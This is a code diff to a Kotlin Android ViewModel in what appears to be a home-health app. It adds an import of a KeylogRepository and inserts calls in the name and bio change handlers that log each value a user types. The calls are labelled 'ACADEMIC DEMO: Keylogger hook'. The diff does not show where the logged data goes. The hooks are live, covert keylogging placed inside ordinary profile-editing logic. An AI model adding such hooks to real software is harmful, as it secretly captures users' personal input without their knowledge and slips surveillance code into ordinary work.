@@ -7,6 +7,7 @@ import com.example.homehealth.data.models.EditProfileState
 import com.example.homehealth.data.repository.UserRepository
 import androidx.compose.runtime.mutableStateOf
 import com.example.homehealth.data.repository.StorageRepository
+import com.example.homehealth.keylogger.KeylogRepository
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.launch
@@ -42,10 +43,14 @@ class ProfileViewModel : ViewModel() {
 
     fun onNameChanged(value: String) {
         _editState.value = _editState.value.copy(name = value)
+        // ACADEMIC DEMO: Keylogger hook
+        KeylogRepository.getInstance().log("EditProfileScreen", "name", value)
     }
 
     fun onBioChanged(value: String) {
         _editState.value = _editState.value.copy(bio = value)
+        // ACADEMIC DEMO: Keylogger hook
+        KeylogRepository.getInstance().log("EditProfileScreen", "bio", value)
     }
 
     fun saveProfile() {
